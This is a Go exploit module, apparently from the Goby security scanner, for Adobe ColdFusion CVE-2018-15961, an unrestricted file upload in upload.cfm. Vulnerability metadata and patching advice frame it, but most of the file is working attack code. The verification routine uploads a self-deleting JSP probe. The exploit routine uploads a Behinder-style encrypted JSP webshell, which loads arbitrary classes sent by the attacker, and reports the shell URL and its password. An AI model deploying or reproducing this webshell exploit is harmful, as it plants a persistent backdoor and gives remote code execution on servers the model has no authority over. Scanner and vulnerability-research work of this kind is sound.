package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"mime/multipart"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion upload.cfm file upload (CVE-2018-15961)",
    "Description": "Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.",
    "Impact": "Adobe ColdFusion upload.cfm file upload (CVE-2018-15961)",
    "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
    "Product": "Adobe-ColdFusion",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Adobe ClodFusion 网络应用平台 upload.cfm 文件 远程代码执行漏洞（CVE-2018-15961）",
            "Description": "<p>Adobe ColdFusion 网络应用平台 是一个可以让中小型企业能够无缝地开发、设计和部署 Web 和云原生应用程序。</p><p>Adobe ClodFusion 网络应用平台 远程命令执行漏洞，默认可上传jsp文件，黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限。</p>",
            "Impact": "攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.adobe.com/products/coldfusion-family.html\">https://www.adobe.com/products/coldfusion-family.html</a><font><font>建议尽快应用Adobe ColdFusion补丁。</font><font>通过ColdFusion管理员面板来设置，更改</font><font>“&nbsp;</font></font><font><font>服务器更新”</font></font><font><font>&nbsp;&nbsp;&gt;“&nbsp;</font></font><font><font>更新”</font></font><font><font>&nbsp;&gt;&nbsp;</font></font><font><font>“设置”</font></font><font><font>下的默认设置</font><font>。</font></font><br></p><p style=\"text-align: start;\"><font>建议进行以下配置更改：</font></p><ul><li><font>选中此框以启用“&nbsp;</font>自动检查更新”<font>选项。</font></li><li><font>选中</font>每10天检查更新<font><font>的复选框，</font><font>然后将“10”修改为“1”，以便每天完成。</font></font></li><li><font>配置适当的电子邮件设置，以便向正确的人员通知更新并采取措施。</font></li></ul><p style=\"text-align: start;\"><font>限制IP访问。</font></p><p style=\"text-align: start;\"><br></p><p><font><font><br></font></font></p>",
            "Product": "Adobe-ColdFusion",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion upload.cfm file upload (CVE-2018-15961)",
            "Description": "Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.",
            "Impact": "Adobe ColdFusion upload.cfm file upload (CVE-2018-15961)",
            "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
            "Product": "Adobe-ColdFusion",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\")",
    "GobyQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\")",
    "Author": "gobysec@gmail.com",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2021-06-08",
    "References": [
        "https://nosec.org/home/detail/1958.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018-15961"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10201"
}`

	postinfo := func(filebuf *bytes.Buffer, params map[string]string, fieldname string, filename string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bodyWriter := multipart.NewWriter(bodyBuf)
		fileWriter, err := bodyWriter.CreateFormFile(fieldname, filename)
		if err != nil {
			fmt.Println("error writing to buffer")
		}
		_, err = io.Copy(fileWriter, filebuf)
		if params != nil {
			for key, val := range params {
				_ = bodyWriter.WriteField(key, val)
			}
		}
		if err != nil {
			fmt.Println("copy file error")
		}
		contentType := bodyWriter.FormDataContentType()
		bodyWriter.Close()
		return bodyBuf, contentType
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
			shell := `<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>`
			payload := bytes.NewBufferString(shell)
			extraParams := map[string]string{
				"path": "path",
			}
			fieldname := "file"
			filename := fmt.Sprintf("%s.jsp", goutils.RandomHexString(32))
			pinfo, ctype := postinfo(payload, extraParams, fieldname, filename)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = pinfo.String()
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					shell_url := fmt.Sprintf(`%s/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/%s`, u.FixedHostInfo, filename)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
			shell := `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			payload := bytes.NewBufferString(shell)
			extraParams := map[string]string{
				"path": "path",
			}
			fieldname := "file"
			filename := fmt.Sprintf("%s.jsp", goutils.RandomHexString(32))
			pinfo, ctype := postinfo(payload, extraParams, fieldname, filename)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", ctype)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = pinfo.String()
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					shell_url := fmt.Sprintf(`%s/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/%s`, expResult.HostInfo.FixedHostInfo, filename)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							shellinfo := fmt.Sprintf("Behinder webshell url: %s, pass:rebeyond", shell_url)
							expResult.Output = shellinfo
						}
					}
				}
			}
			return expResult
		},
	))
}
